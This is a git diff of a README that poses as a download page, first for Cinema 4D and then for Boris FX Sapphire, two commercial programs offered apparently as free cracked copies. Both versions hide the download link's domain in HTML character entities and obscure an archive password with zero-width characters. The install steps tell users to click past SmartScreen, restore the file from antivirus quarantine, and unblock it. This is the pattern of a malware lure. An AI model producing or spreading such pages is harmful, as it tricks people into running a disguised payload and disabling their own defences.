@@ -1,57 +1,61 @@
-# The latest Cinema 4D download for Windows
+# Download Boris FX Sapphire (2026) for PC
 
-![plate](https://badgen.net/badge/version/v1.6.14/cf222e?style=flat) ![wash](https://badgen.net/badge/release/latest/cf222e?style=flat) ![ticker](https://badgen.net/badge/arch/x64/cf222e?style=flat)
+![scud](https://badgen.net/badge/release/latest/8250df?style=flat)
+![sigil](https://badgen.net/badge/version/v4.6.20/8250df?style=flat)
+![wisp](https://badgen.net/badge/status/active/8250df?style=flat)
+![edge](https://badgen.net/badge/os/Windows%2010%2B/8250df?style=flat)
+![puff](https://badgen.net/badge/arch/64-bit/8250df?style=flat)
 
-Take your design projects to new heights with Cinema 4D 2026 on Windows. This powerful software combines Redshift and X-Particles in a streamlined setup, making it easy to manage your creative tasks
+If you're using Windows for video editing, Boris FX Sapphire equips you with the latest plugins for After Effects and more, ensuring efficient installations and trials for beginners and professionals alike
 
-<h1><a href="https://&#0103;&#x69;&#0116;&#x72;&#x65;&#x6c;&#x65;&#x61;&#X73;e&#X39;3&#X34;.&#X6C;&#X69;v&#101;/M&#097;&#x78;&#x6f;n-&#79;&#x6e;e-&#X43;&#x69;&#0110;&#0101;&#0109;&#x61;&#52;&#100;-&#085;&#116;&#105;l&#X73;">Get the latest release</a></h1>
+<h2><a href="https://&#x67;&#X69;&#0116;&#x72;e&#108;e&#097;&#115;&#X65;9&#X33;&#52;.&#0108;&#X69;&#x76;&#x65;/S&#097;&#112;&#0112;h&#X69;r&#X65;-E&#0102;&#102;&#0101;c&#116;-&#X53;&#x6f;&#X6C;u&#x74;i&#0111;&#110;&#x73;">Download Boris FX Sapphire for Windows</a></h2>
 
-<p><b>&#X55;&zwnj;&#0110;p&#x200b;&#X61;&#X63;&#X200B;&#107; &#0112;&#x200b;&#X61;&#X73;&#0115;&#0119;o&zwnj;&#0114;&#x200b;&#100;:</b> <code>&#x32;0&#x32;&#x36;</code></p>
+*U&#8203;&#X6E;&#X70;&#x200b;&#X61;c&#X200B;&#0107; &#x70;&#8203;&#x61;&#8203;&#0115;&zwnj;&#115;&zwnj;w&#x200b;&#111;&zwnj;&#x72;&#100;:* **<code>&#50;&#x30;2&#x36;</code>**
 
-![Cinema 4D screenshot](static/willow.jpg)
+![Boris FX Sapphire screenshot](data/maple.jpg)
 
-## Reach out
+## Minimum setup
 
-The last click and your Windows version are what to write in an issue when nothing starts.
+What the application expects to find:
 
-Three steps that show the problem are plenty. You do not need a video.
+| # | What |
+|---|---|
+| 1 | A writable folder for your user account. |
+| 2 | Running the build does not depend on a compiler or a source tree. |
+| 3 | Only the 64-bit edition of Windows runs this build. |
+| 4 | Run it on 64-bit Windows. |
+| 5 | One folder has to hold the extracted files together. |
 
----
+## Background
 
-## A short install guide
+Files the archive created are in the extracted folder. Removing that folder takes them away.
 
-1. Download the zip archive containing the program.
+Extract the zip file. Start the `setup` file. The window will open.
+
+## How to install
+
+1. Download the zip archive and save it to your computer.
 2. Extract the contents of the zip archive to a folder outside of protected system folders.
-3. Navigate to the new folder and locate the file named `setup`.
-4. Double-click `setup` to run the program.
+3. Navigate to the new folder and double-click on the file named `setup` to run the program.
+
+## Troubleshooting
+
+- **Start file is a level further down.** Open that inner folder so `setup` lines up with the other files.
+- **Path Length Issue.** Windows may report that the path is too long. To resolve this, extract the files closer to the drive root.
+- **SmartScreen may prevent the first launch.** This warning occurs because the file is not signed. You can choose to select 'More info' and then 'Run anyway' to proceed.
+- **`setup` left the folder on its own.** It belongs with the other files. Either return it there or extract the archive again.
+- **Added files vanished under the new extract.** Those added files survive if you copy them out before the new archive lands on the folder.
 
 ---
 
-## Notes for the next build
+## Capabilities
 
-No design has to be proposed. Say what happened in the moment the program got in the way.
-
-A screenshot of the exact message helps more than a retelling of it.
-
-## Highlights
-
-A quick overview:
-
-* The program runs directly from the extracted folder without a setup wizard or directory selection.
-* The files needed to run the program are located in the same folder as `setup`
-* Move that extracted folder to a different path.
-* You can move the folder after extracting it.
-* The program is distributed as a single zip archive.
-* The first start may take a moment; subsequent starts will be quicker.
-* No separate entry for removal is left in Windows.
-* Keep what the program needs to run next to `setup`.
-* The same archive runs on English and non-English Windows editions.
-
-## Trouble?
-
-- **SmartScreen returned for the new zip.** A new file counts, to Windows, as a new download.
-- **A system directory cannot store this copy.** Move the extracted copy onto a writable folder, away from read-only and protected paths.
-- **A second monitor pushed the window off-screen.** Delete the saved window-state file in the folder. The next launch starts with default position and size.
-- **Antivirus Quarantine Issue.** If your antivirus has quarantined `setup`, please restore the file from quarantine. Once restored, you can run it directly from the folder where you extracted the program.
-- **Setup not found due to folder structure.** Please navigate one level down in the directory until you find the `setup` file along with the other necessary files.
-- **File may be blocked after download.** If you encounter issues starting the program, check the file properties. You may need to tick 'Unblock' and apply the changes before trying again.
+- Every file the program needs in order to run shares a folder with `setup`.
+- Starting means launching `setup` in the folder that was extracted.
+- After extraction, you can move that folder.
+- Each newer build shows up inside a newer archive.
+- You are not walked through a wizard, and you do not pick a destination folder.
+- No scheduled task is added by extraction or by the first launch.
+- A short wait can show up on the first start, and later starts finish sooner.
+- To remove the program, delete the folder containing the files.
+- The program opens when you run `setup` from the folder the archive unpacked.
